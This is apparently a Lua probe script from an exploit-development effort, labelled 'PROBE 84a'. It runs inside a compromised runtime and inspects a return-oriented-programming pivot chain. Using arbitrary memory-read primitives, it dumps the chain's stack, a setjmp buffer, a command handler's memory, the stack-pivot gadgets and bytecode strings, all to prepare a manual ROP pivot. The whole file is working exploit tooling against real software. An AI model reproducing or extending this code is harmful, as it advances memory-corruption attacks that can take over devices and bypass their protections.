-- CRASH_CLASS: LOW
-- PROBE 84a: Understand the pivot chain structure to manually initialize
-- The fcall chain (fcall.chain) is finalized. The pivot_handler_rop is not.
-- native.fcall calls native_invoke(native_cmd_handler, native_cmd="fcall")
-- native_invoke is a C function that does the actual ROP pivot.
-- We need to understand what native_invoke expects.

print("=== PROBE 84a: MANUAL PIVOT ===")

-- Dump native_invoke info
print("--- NATIVE_INVOKE ---")
print("type=" .. type(native_invoke))
local is_lua = pcall(string.dump, native_invoke)
print("lua=" .. tostring(is_lua))
-- native_invoke is a C function - it's the actual ROP trigger

-- The fcall chain has everything we need:
-- stack_base = 0x3113fe0f0 (real heap address)
-- stack_size = 8192
-- jmpbuf = 0x311400130
-- fn_addr arg at 0x3113fc040
-- The chain is finalized with all the ROP gadgets written

-- Check if the chain's stack has real data
print("")
print("--- FCALL CHAIN STACK ---")
local base_lo = 0
local base_hi = 0
if fcall and fcall.chain and fcall.chain.stack_base then
    local sb = fcall.chain.stack_base
    print("stack_base=" .. tostring(sb))
    -- Read first few qwords of the chain
    for off = 0, 0x78, 8 do
        local ok, val = pcall(function() return memory.read_qword(sb + off) end)
        if ok then
            print(string.format("+0x%02X=%s", off, tostring(val)))
        end
    end
end

-- Check the pivot_handler_rop chain (separate from fcall)
print("")
print("--- PIVOT HANDLER CHAIN ---")
if native and native.pivot_handler_rop then
    local p = native.pivot_handler_rop
    print("stack_base=" .. tostring(p.stack_base))
    print("stack_size=" .. tostring(p.stack_size))
    print("stack_offset=" .. tostring(p.stack_offset))
    print("jmpbuf=" .. tostring(p.jmpbuf))
    print("lock=" .. tostring(p.lock))
    print("lua_state=" .. tostring(p.lua_state))
    print("enable_mock_push=" .. tostring(p.enable_mock_push))

    -- Check if stack_base points to readable memory
    if p.stack_base then
        local ok, val = pcall(function() return memory.read_qword(p.stack_base) end)
        print("*stack_base readable=" .. tostring(ok))
        if ok then print("*stack_base=" .. tostring(val)) end
    end
end

-- Check native_cmd_handler address and what's there
print("")
print("--- CMD HANDLER ---")
print("native_cmd_handler=" .. string.format("0x%X", native_cmd_handler))
-- Read some bytes at cmd handler address
for off = 0, 0x38, 8 do
    local ok, val = pcall(function()
        return memory.read_qword(uint64(string.format("0x%X", native_cmd_handler + off)))
    end)
    if ok then
        print(string.format("cmd+0x%02X=%s", off, tostring(val)))
    end
end

-- Check what map_fixed_address does (bytecode)
print("")
print("--- MAP_FIXED_ADDRESS ---")
if map_fixed_address then
    local ok, src = pcall(string.dump, map_fixed_address)
    if ok then
        local strs = {}
        local i = 1
        while i <= #src do
            local s = ""
            while i <= #src and src:byte(i) >= 32 and src:byte(i) <= 126 do
                s = s .. src:sub(i, i)
                i = i + 1
            end
            if #s >= 3 then strs[#strs+1] = s end
            i = i + 1
        end
        print("len=" .. #src .. " strings:")
        for _, s in ipairs(strs) do print("  " .. s) end
    end
end

-- Check stack_pivot gadget
print("")
print("--- STACK PIVOT ---")
if gadgets and gadgets["stack_pivot"] then
    local sp = gadgets["stack_pivot"]
    if type(sp) == "table" then
        for k, v in pairs(sp) do
            print("SP:" .. tostring(k) .. "=" .. tostring(v))
        end
    else
        print("stack_pivot=" .. tostring(sp))
    end
end

-- Try reading the jmpbuf to see if setjmp was already called
print("")
print("--- JMPBUF ---")
if fcall and fcall.chain and fcall.chain.jmpbuf then
    local jb = fcall.chain.jmpbuf
    print("jmpbuf addr=" .. tostring(jb))
    for off = 0, 0x58, 8 do
        local ok, val = pcall(function()
            return memory.read_qword(uint64(string.format("0x%X", jb + off)))
        end)
        if ok then print(string.format("jb+0x%02X=%s", off, tostring(val))) end
    end
end

print("=== PROBE 84a COMPLETE ===")
